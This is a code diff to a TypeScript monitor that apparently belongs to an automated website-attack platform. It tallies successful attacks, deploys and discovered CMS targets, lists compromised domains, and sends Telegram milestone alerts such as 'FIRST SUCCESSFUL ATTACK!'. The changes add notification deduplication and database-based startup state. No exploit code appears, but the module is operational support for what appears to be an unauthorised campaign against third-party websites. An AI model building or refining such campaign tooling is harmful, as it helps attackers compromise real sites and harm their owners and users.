@@ -66,6 +66,30 @@ const THRESHOLDS_NOTIFIED = new Set<number>();
 let lastDailySummary = 0;
 let monitorInterval: ReturnType<typeof setInterval> | null = null;
 
+// ═══ DEDUP: Prevent duplicate notifications ═══
+let firstSuccessNotified = false; // persists across snapshots within same process
+const recentNotificationHashes = new Map<string, number>(); // hash → timestamp
+const DEDUP_WINDOW_MS = 10 * 60 * 1000; // 10 minutes dedup window
+
+function getNotificationHash(type: string, key: string): string {
+  return `${type}:${key}`;
+}
+
+function isDuplicate(type: string, key: string): boolean {
+  const hash = getNotificationHash(type, key);
+  const lastSent = recentNotificationHashes.get(hash);
+  if (lastSent && Date.now() - lastSent < DEDUP_WINDOW_MS) {
+    return true;
+  }
+  recentNotificationHashes.set(hash, Date.now());
+  // Clean old entries
+  const now = Date.now();
+  Array.from(recentNotificationHashes.entries()).forEach(([h, ts]) => {
+    if (now - ts > DEDUP_WINDOW_MS) recentNotificationHashes.delete(h);
+  });
+  return false;
+}
+
 // ═══════════════════════════════════════════════
 //  CORE: Collect Snapshot
 // ═══════════════════════════════════════════════
@@ -177,53 +201,20 @@ async function checkAndAlert(snapshot: SuccessRateSnapshot) {
     ? history.snapshots[history.snapshots.length - 1]
     : null;
 
-  // 1. First successful attack ever!
-  if (snapshot.successfulAttacks > 0 && (!prevSnapshot || prevSnapshot.successfulAttacks === 0)) {
-    const msg = [
-      "🎉 <b>FIRST SUCCESSFUL ATTACK!</b>",
-      "",
-      `✅ Success Rate: ${snapshot.successRate.toFixed(1)}%`,
-      `🎯 Total Attacks: ${snapshot.totalAttacks}`,
-      `✅ Successful: ${snapshot.successfulAttacks}`,
-      `❌ Failed: ${snapshot.failedAttacks}`,
-      "",
-      `🏆 Domains: ${snapshot.topSuccessfulDomains.join(", ") || "N/A"}`,
-      "",
-      `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
-    ].join("\n");
-
-    await sendTelegramNotification({
-      type: "success",
-      targetUrl: "success-rate-monitor",
-      details: msg,
-    });
-
-    history.milestones.push({
-      type: "first_success",
-      value: snapshot.successRate,
-      timestamp: Date.now(),
-      message: "First successful attack achieved!",
-    });
-    history.alertsSent++;
-  }
-
-  // 2. Success rate crosses threshold
-  const thresholds = [5, 10, 25, 50, 75];
-  for (const threshold of thresholds) {
-    if (snapshot.successRate >= threshold && !THRESHOLDS_NOTIFIED.has(threshold)) {
-      THRESHOLDS_NOTIFIED.add(threshold);
-
+  // 1. First successful attack ever! (only send ONCE per process lifetime)
+  if (snapshot.successfulAttacks > 0 && !firstSuccessNotified && (!prevSnapshot || prevSnapshot.successfulAttacks === 0)) {
+    firstSuccessNotified = true; // Mark as notified — never send again
+    
+    if (!isDuplicate("first_success", "global")) {
       const msg = [
-        `📈 <b>SUCCESS RATE MILESTONE: ${threshold}%</b>`,
+        "🎉 FIRST SUCCESSFUL ATTACK!",
         "",
-        `✅ Current Rate: ${snapshot.successRate.toFixed(1)}%`,
-        `🎯 Total: ${snapshot.totalAttacks} attacks`,
+        `✅ Success Rate: ${snapshot.successRate.toFixed(1)}%`,
+        `🎯 Total Attacks: ${snapshot.totalAttacks}`,
         `✅ Successful: ${snapshot.successfulAttacks}`,
-        `📊 Deploys: ${snapshot.totalDeploys} (${snapshot.deploySuccessRate.toFixed(1)}% success)`,
-        `🔍 Targets: ${snapshot.targetsDiscovered} discovered, ${snapshot.targetsWithCms} with CMS`,
+        `❌ Failed: ${snapshot.failedAttacks}`,
         "",
-        `📊 CMS: ${Object.entries(snapshot.cmsBreakdown).map(([k, v]) => `${k}: ${v}`).join(", ") || "none detected"}`,
-        `📈 Trend: ${snapshot.recentTrend}`,
+        `🏆 Domains: ${snapshot.topSuccessfulDomains.join(", ") || "N/A"}`,
         "",
         `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
       ].join("\n");
@@ -235,12 +226,54 @@ async function checkAndAlert(snapshot: SuccessRateSnapshot) {
       });
 
       history.milestones.push({
-        type: "rate_threshold",
-        value: threshold,
+        type: "first_success",
+        value: snapshot.successRate,
         timestamp: Date.now(),
-        message: `Success rate crossed ${threshold}%`,
+        message: "First successful attack achieved!",
       });
       history.alertsSent++;
+    }
+  } else if (snapshot.successfulAttacks > 0) {
+    // Already had successes before — mark as notified to prevent future spam
+    firstSuccessNotified = true;
+  }
+
+  // 2. Success rate crosses threshold
+  const thresholds = [5, 10, 25, 50, 75];
+  for (const threshold of thresholds) {
+    if (snapshot.successRate >= threshold && !THRESHOLDS_NOTIFIED.has(threshold)) {
+      THRESHOLDS_NOTIFIED.add(threshold);
+
+      if (!isDuplicate("threshold", String(threshold))) {
+        const msg = [
+          `📈 SUCCESS RATE MILESTONE: ${threshold}%`,
+          "",
+          `✅ Current Rate: ${snapshot.successRate.toFixed(1)}%`,
+          `🎯 Total: ${snapshot.totalAttacks} attacks`,
+          `✅ Successful: ${snapshot.successfulAttacks}`,
+          `📊 Deploys: ${snapshot.totalDeploys} (${snapshot.deploySuccessRate.toFixed(1)}% success)`,
+          `🔍 Targets: ${snapshot.targetsDiscovered} discovered, ${snapshot.targetsWithCms} with CMS`,
+          "",
+          `📊 CMS: ${Object.entries(snapshot.cmsBreakdown).map(([k, v]) => `${k}: ${v}`).join(", ") || "none detected"}`,
+          `📈 Trend: ${snapshot.recentTrend}`,
+          "",
+          `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
+        ].join("\n");
+
+        await sendTelegramNotification({
+          type: "success",
+          targetUrl: "success-rate-monitor",
+          details: msg,
+        });
+
+        history.milestones.push({
+          type: "rate_threshold",
+          value: threshold,
+          timestamp: Date.now(),
+          message: `Success rate crossed ${threshold}%`,
+        });
+        history.alertsSent++;
+      }
     }
   }
 
@@ -249,7 +282,7 @@ async function checkAndAlert(snapshot: SuccessRateSnapshot) {
     const drop = prevSnapshot.successRate - snapshot.successRate;
     if (drop > 10) {
       const msg = [
-        `📉 <b>SUCCESS RATE DROP ALERT</b>`,
+        `📉 SUCCESS RATE DROP ALERT`,
         "",
         `⚠️ Rate dropped from ${prevSnapshot.successRate.toFixed(1)}% → ${snapshot.successRate.toFixed(1)}%`,
         `📉 Drop: -${drop.toFixed(1)}%`,
@@ -286,7 +319,7 @@ async function checkAndAlert(snapshot: SuccessRateSnapshot) {
       : 0;
 
     const msg = [
-      `📊 <b>DAILY SUCCESS RATE SUMMARY</b>`,
+      `📊 DAILY SUCCESS RATE SUMMARY`,
       "",
       `✅ Current Rate: ${snapshot.successRate.toFixed(1)}%`,
       `${rateChange >= 0 ? "📈" : "📉"} 24h Change: ${rateChange >= 0 ? "+" : ""}${rateChange.toFixed(1)}%`,
@@ -326,6 +359,50 @@ async function checkAndAlert(snapshot: SuccessRateSnapshot) {
 // ═══════════════════════════════════════════════
 
 /**
+ * Initialize state from DB to prevent duplicate notifications after restart
+ */
+async function initializeFromDb(): Promise<void> {
+  try {
+    const db = await getDb();
+    if (!db) return;
+    
+    // Check if we already have successful attacks in DB
+    const [stats] = await db.select({
+      successful: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = true THEN 1 ELSE 0 END)`,
+    }).from(aiAttackHistory);
+    
+    const successCount = Number(stats?.successful || 0);
+    if (successCount > 0) {
+      firstSuccessNotified = true; // Already had successes before this process
+      console.log(`[SuccessRateMonitor] DB shows ${successCount} prior successes — skipping first_success notification`);
+    }
+    
+    // Pre-populate threshold notifications based on current rate
+    const [totalStats] = await db.select({
+      total: count(),
+      successful: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = true THEN 1 ELSE 0 END)`,
+    }).from(aiAttackHistory);
+    
+    const total = Number(totalStats?.total || 0);
+    const successful = Number(totalStats?.successful || 0);
+    const currentRate = total > 0 ? (successful / total) * 100 : 0;
+    
+    // Mark thresholds already crossed
+    const thresholds = [5, 10, 25, 50, 75];
+    for (const t of thresholds) {
+      if (currentRate >= t) {
+        THRESHOLDS_NOTIFIED.add(t);
+      }
+    }
+    if (THRESHOLDS_NOTIFIED.size > 0) {
+      console.log(`[SuccessRateMonitor] Pre-marked thresholds: ${Array.from(THRESHOLDS_NOTIFIED).join(', ')}%`);
+    }
+  } catch (err: any) {
+    console.error("[SuccessRateMonitor] initializeFromDb error:", err.message);
+  }
+}
+
+/**
  * Start the success rate monitor — collects snapshots every 30 minutes
  */
 export function startSuccessRateMonitor() {
@@ -336,8 +413,13 @@ export function startSuccessRateMonitor() {
 
   console.log("[SuccessRateMonitor] Starting — collecting snapshots every 30 minutes");
 
-  // Collect initial snapshot
-  collectAndStore().catch(err => console.error("[SuccessRateMonitor] Initial collection failed:", err));
+  // On startup: check DB to see if we already have successes — prevent re-sending "first success"
+  initializeFromDb().then(() => {
+    collectAndStore().catch(err => console.error("[SuccessRateMonitor] Initial collection failed:", err));
+  }).catch((err: any) => {
+    console.error("[SuccessRateMonitor] DB init failed, collecting anyway:", err.message);
+    collectAndStore().catch(err2 => console.error("[SuccessRateMonitor] Initial collection failed:", err2));
+  });
 
   // Schedule periodic collection (every 30 minutes)
   monitorInterval = setInterval(async () => {
